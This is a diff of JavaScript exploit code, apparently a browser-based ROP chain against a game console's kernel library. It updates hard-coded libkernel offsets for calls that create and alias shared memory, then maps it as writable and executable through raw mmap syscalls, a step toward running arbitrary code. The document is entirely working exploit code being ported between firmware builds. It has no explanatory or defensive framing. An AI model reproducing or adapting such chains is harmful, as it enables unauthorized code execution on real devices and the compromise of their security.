@@ -76,7 +76,7 @@ function cleanSessionVars() {
 // STAGE 1
 function allocateSharedMemory() {
 	//changed here
-	chain.call("createSharedMemory", LIBKERNEL, 0x1A0A0 , 0, SECTIONSIZE, 1 | 2 | 4, chain.data);
+	chain.call("createSharedMemory", LIBKERNEL, 0x19DD0 , 0, SECTIONSIZE, 1 | 2 | 4, chain.data);
 	chain.execute(function() {
 		var executableHandle = getU8from(chain.data);
 		logAdd("Executable Handle 0x" + executableHandle.toString(16)); // 0x52
@@ -92,7 +92,7 @@ function allocateSharedMemory2() {
 	//changed here
 	var executableHandle = JSON.parse(sessionStorage.executableHandle || "{}");
 
-	chain.call("createSharedMemoryAlias", LIBKERNEL, 0x1A0F0 , executableHandle, 1 | 2, chain.data);
+	chain.call("createSharedMemoryAlias", LIBKERNEL, 0x19E20 , executableHandle, 1 | 2, chain.data);
 	chain.syscall("mmap", 477, 0x93a500000, SECTIONSIZE * 2, 1 | 2, 4096, -1, 0);
 	chain.write_rax_ToVariable(0);
 	
@@ -124,7 +124,7 @@ function mapSharedMemory() {
 	var executableHandle = JSON.parse(sessionStorage.executableHandle || "{}");
 	var writableHandle = JSON.parse(sessionStorage.writableHandle || "{}");
 
-	chain.call("mapSharedMemory", LIBKERNEL, 0x1A140 , writableHandle, 1 | 2, chain.data);
+	chain.call("mapSharedMemory", LIBKERNEL, 0x19E70 , writableHandle, 1 | 2, chain.data);
 	chain.syscall("mmap", 477, 0x93a300000, SECTIONSIZE, 1 | 4, 1, executableHandle, 0);
 	chain.write_rax_ToVariable(0);
 	
